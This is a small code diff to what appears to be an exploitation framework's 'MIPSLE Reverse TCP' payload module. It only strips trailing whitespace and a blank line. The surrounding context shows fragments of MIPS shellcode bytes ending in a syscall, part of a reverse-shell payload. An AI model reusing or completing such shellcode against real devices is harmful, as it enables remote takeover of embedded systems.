@@ -10,7 +10,7 @@ class Exploit(payloads.Payload):
         'name': 'MIPSLE Reverse TCP',
         'authors': [
         ],
-        'description': '', 
+        'description': '',
         'references': [
         ],
     }
@@ -74,4 +74,3 @@ class Exploit(payloads.Payload):
             "\xab\x0f\x02\x24" +            # li      v0,4011
             "\x0c\x09\x09\x01"              # syscall 0x42424
         )
-
